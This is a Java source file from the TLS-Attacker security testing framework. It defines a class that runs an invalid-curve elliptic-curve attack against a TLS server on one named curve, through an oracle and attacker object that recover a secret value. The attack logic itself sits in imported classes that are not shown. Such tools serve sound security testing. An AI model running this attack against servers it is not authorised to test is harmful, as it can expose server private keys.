package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.EllipticCurveAttackCommandConfig;
import de.rub.nds.tlsattacker.attacks.ec.ICEAttacker;
import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.crypto.ec.Curve;
import de.rub.nds.tlsattacker.tls.crypto.ec.CurveFactory;
import de.rub.nds.tlsattacker.tls.exceptions.ConfigurationException;
import java.math.BigInteger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class EllipticCurveAttack extends Attacker<EllipticCurveAttackCommandConfig> {

    static Logger LOGGER = LogManager.getLogger(EllipticCurveAttack.class);

    public EllipticCurveAttack(EllipticCurveAttackCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	if (config.getNamedCurves().size() > 1) {
	    throw new ConfigurationException("Please specify only one named curve which should be attacked");
	}

	LOGGER.info("Executing attack against the server with named curve {}", config.getNamedCurves().get(0));

	Curve curve = CurveFactory.getNamedCurve(config.getNamedCurves().get(0).name());
	RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(config, curve);
	ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations());
	attacker.attack();
	BigInteger result = attacker.getResult();
    }

}
